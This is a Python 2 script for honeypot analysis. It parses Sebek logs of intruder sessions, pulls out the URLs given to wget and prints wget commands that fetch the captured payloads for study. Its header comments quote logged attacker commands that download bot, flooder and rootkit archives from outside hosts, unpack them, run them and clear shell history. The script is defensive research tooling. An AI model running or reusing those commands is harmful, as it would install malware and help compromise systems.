#!/usr/bin/python

#[2010-05-24 21:02:20 Host:172.31.0.67 UID:1002 PID:22934 CMD:sh]:cmd=wget
#[2010-05-24 21:03:43 Host:172.31.0.67 UID:1002 PID:22934 CMD:sh]:cmd=wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
#[2010-05-24 21:03:43 Host:172.31.0.67 UID:1002 PID:22933 CMD:sshd]:cmd=slsps xuname a -awgetttar./ca t /oritt /c/cpuinfocd /var/tmp;lsls
#[2010-05-24 21:09:43 Host:172.31.0.67 UID:1002 PID:22934 CMD:sh]:cmd=wget ftp://user:user@62.213.33.10/s.tgz;tar xzvf s.tgz;rm -rf s.tgz;cd .s;chmod +x *
#[2010-05-30 07:18:39 Host:172.31.0.67 UID:1000 PID:26000 CMD:sh]:cmd=wget http://download.microsoft.com/download/win2000platform/SP/SP3/NT5/EN-US/W2Ksp3.exe
#[2010-05-30 08:48:07 Host:172.31.0.67 UID:1000 PID:26000 CMD:sh]:cmd=wget http://members.lycos.co.uk/crameru/e.tgz
#[2010-05-30 08:55:24 Host:172.31.0.67 UID:1000 PID:26000 CMD:sh]:cmd=wget http://trlstan.webs.com/fast.tar
#[2010-05-31 13:11:05 Host:172.31.0.67 UID:1002 PID:2527 CMD:sh]:cmd=wget
#[2010-05-31 13:11:36 Host:172.31.0.67 UID:1002 PID:2527 CMD:sh]:cmd=wget ftp://user:user@62.213.33.10/s.tgz;tar xzvf s.tgz;rm -rf s.tgz;cd .s;chmod +x *
#[2010-05-31 13:12:03 Host:172.31.0.67 UID:1002 PID:2526 CMD:sshd]:cmd=ops xwgettar./cd /var/tnmpnpmpls -acd " "lscat /proc/cpuinfpomkdir " "lscd " "ls -a
#[2010-06-02 07:16:52 Host:172.31.0.67 UID:1000 PID:20422 CMD:sh]:cmd=wget rootteam.net/mata.tgz; tar zxvf mata.tgz; cd .aw; chmod +x *; ./start lam3rz
#[2010-06-08 14:10:16 Host:172.31.0.67 UID:1000 PID:2113 CMD:sh]:cmd=wget Http://roothelp.webs.com/cgi.gz
#[2010-06-14 22:57:34 Host:172.31.0.67 UID:1000 PID:28444 CMD:sh]:cmd=wget
#[2010-06-19 10:39:12 Host:172.31.0.67 UID:1002 PID:1140 CMD:sh]:cmd=wget http://localhost.ilive.ro/ph.jpg
#[2010-06-22 23:47:29 Host:172.31.0.67 UID:1001 PID:32377 CMD:sh]:cmd=wget
#[2010-06-22 23:48:03 Host:172.31.0.67 UID:1001 PID:32377 CMD:sh]:cmd=wget Urs.ucoz.ru/[BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]passwd
#[2010-06-22 23:49:08 Host:172.31.0.67 UID:1001 PID:32377 CMD:sh]:cmd=wget Urs.ucoz.ru/linuxmech.tgz
#[2010-06-22 23:49:10 Host:172.31.0.67 UID:1001 PID:32376 CMD:sshd]:cmd=wuname -awgetcat /proc/cpuinfocat tc/issueuptimecat c/hostscd /tmp/.X11-unixwget Urs.ucoz.ru/passwdwget Urs.ucoz.ru/linuxmech.tgz
#[2010-06-22 23:51:54 Host:172.31.0.67 UID:1001 PID:32414 CMD:sh]:cmd=wget Urs.ucoz.ru/muh.tgz
#[2010-06-22 23:51:54 Host:172.31.0.67 UID:1001 PID:32413 CMD:sshd]:cmd=cd /tmp/.X11-unixlscd mechpico mechlspico .setnano mechrm -cd -rm rf -rf mechlswget Urs.ucoz.ru/muh.tgz
#[2010-06-25 00:49:52 Host:172.31.0.67 UID:1002 PID:17809 CMD:sh]:cmd=wget pibo.com/.x/flood/udp.tar
#[2010-06-25 06:11:04 Host:172.31.0.67 UID:1001 PID:18921 CMD:sh]:cmd=wget freewebtown.com/luzeer/stuff/botz.txt
#[2010-06-29 23:27:29 Host:172.31.0.67 UID:1000 PID:964 CMD:sh]:cmd=wget hackro.home.ro
#[2010-06-29 23:27:57 Host:172.31.0.67 UID:1000 PID:964 CMD:sh]:cmd=w[BS][BS][BS]wget hackro.home.ro/bots.tar.gz
#[2010-06-30 05:44:32 Host:172.31.0.67 UID:1002 PID:2365 CMD:sh]:cmd=wget angelfire.com/komales88/img.tgz
#[2010-06-30 05:44:33 Host:172.31.0.67 UID:1002 PID:2332 CMD:sshd]:cmd=wpasswdhhistoryhistory -ccd /var/tmplscd botsps xlsvi kswap.setlscd ..lsls -acrm -rf  wget angelfire.com/komales88/img.tgz

import re
from urlparse import urlparse

# Crude method to extract URL : URL contains '/' or '.' or alphanumeric
# prepend http:// if not found
def extractURL(line):
    try :
        print "extract_url.py : extractURL() : entered with line=" + line
        
        if line.find("[") != -1:	# [BS] , [U-ARROW] etc from sebek
            print "extract_url.py : extractURL() : editing keystrokes found , so no further analysis possible at the moment. line=" + line
            return ""
        
        pat = "wget ([A-Z\.\-:~a-z0-9@/]*)" 
        a = re.findall(pat,line)
        print "extract_url.py() : extractURL() : a = " + `a`
        if len(a) != 0 : 		# bug here !
            print "extract_url.py() : extractURL() : located URL : " + a[0]
            # if URL contains no other scheme, then assume http
            # bug : Http will not match so convert to lower-case
            a[0] = a[0].lower()
            if a[0].find('http://') == -1 and a[0].find('ftp://') == -1 :
                a[0] = 'http://' + a[0]
            print "extract_url.py() : extractUL() : normalised URL = " + a[0]
            return a[0]   
        else:
            print "extract_url.py() : extractUL() : error - no URL found " + line
            return ""   

    except Exception,e:
        syslog.syslog("extract_url.py : extractURL() exception caught = " + `e` + " line=" + line)
        print "extract_url.py : extractURL() exception caught = " + `e` + " line=" + line
        return ""
            
# extract domain from FTP URL
# ftp://user:user@62.213.33.10/s.tgz
def extractDomainFTP(line):
    ftpInfo = {}
    #print "FTP : URL is " + url
    domain = "127.0.0.1"
  
    a = line.split("@")[1]
    domain = a.split('/')[0]  
    path   = '/' + a.split('/')[1]
    #print "FTP : domain is " + domain
    #print "FTP : path   is " + path
    
    ftpInfo['domain'] = domain
    ftpInfo['path'] = path
    #print "FTP : domain is " + ftpInfo['domain']
    #print "FTP : path   is " + ftpInfo['path']
    
    return ftpInfo

# Some haxxors seem to want to download from Microsoft.com ?
def urlBlacklist(url):
    if url.find("microsoft.com") != -1 :
        return True
    else:
        return False 
    
    #if line.find("[") != -1:	# [BS] , [U-ARROW] etc from sebek
    #    return ""
        
    #pat = "wget ([A-Z\.\-:~a-z0-9@/]*)" 
    #a = re.findall(pat,line)
    #if len(a) != 0 :
        #print "Located URL : " + a[0]
        # if URL contains no other scheme, then assume http
        # bug : Http will not match so convert to lower-case
    #    a[0] = a[0].lower()
    #    if a[0].find('http://') == -1 and a[0].find('ftp://') == -1 :
    #        a[0] = 'http://' + a[0]
    #    return a[0]   
    #else:
    #    return ""   


# TESTING ---------

#a=extractURL("cmd=wget angelfire.com/komales88/img.tgz")
#print "\nURL is " + a
#print "Hostname is " + extractHostname(a)

#a=extractURL("cmd=wget rootteam.net/mata.tgz; tar zxvf mata.tgz; cd .aw; chmod +x *; ./start lam3rz ")
#print "\nURL is " + a
#print "Hostname is " + extractHostname(a)

#a=extractURL("cmd=wget Urs.ucoz.ru/[BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS][BS]passwd")
#print "\nURL is " + a
#print "Hostname is " + extractHostname(a)


if __name__ == '__main__' :
    
    f = open("/home/var/log/sebek.log.txt")
    ftpInfo = {}

    while True:
        line=f.readline()
        if not line: 
            #print "Reached EOF, aborting..."
            break

        line=line.rstrip('\n')
    
        fields=line.split('=')
        #print fields
        cmd = fields[1]
        if len(cmd) == 0 :
            continue
        else:
            #print "cmd is " + cmd
            pass

        url = extractURL(cmd)    
        o = urlparse(url)
        domain = "127.0.0.1"
        path   = ""
    
        if o.scheme == 'ftp' :
            ftpInfo = extractDomainFTP(url)
            domain = ftpInfo['domain']
            path   = ftpInfo['path']
            #print "\nFTP!"
            #print "cmd        : " + cmd
            #print "URL        : " + url
            #print "scheme     : " + `o.scheme`
            #print "port       : " + `o.port`
            #print "Hostname   : " + `o.netloc`
        elif len(url) != 0 :
            #print "\ncmd        : " + cmd
            #print "URL        : " + url
            #print "scheme     : " + `o.scheme`
            #print "port       : " + `o.port`
            #print "Hostname   : " + `o.netloc`
            domain = o.netloc
            path   = o.path
        else:
            continue
        
        # Valid URL        
        if len(path) != 0 :
            #print "---"
            #print "cmd is " + cmd
            #print "normalised URL is "  + url
            #print "scheme is is "  + o.scheme
            #print "domain is " + domain
            #print "path is " + path
        
            if o.scheme == 'http' and urlBlacklist(url) == False :
                print "wget --tries=2 --connect-timeout=10 " + url
                #print "command to download whole directory is : wget ???"
            elif o.scheme == 'ftp' and urlBlacklist(url) == False :
                print "wget --tries=2 connect-timeout=10 " + url
            
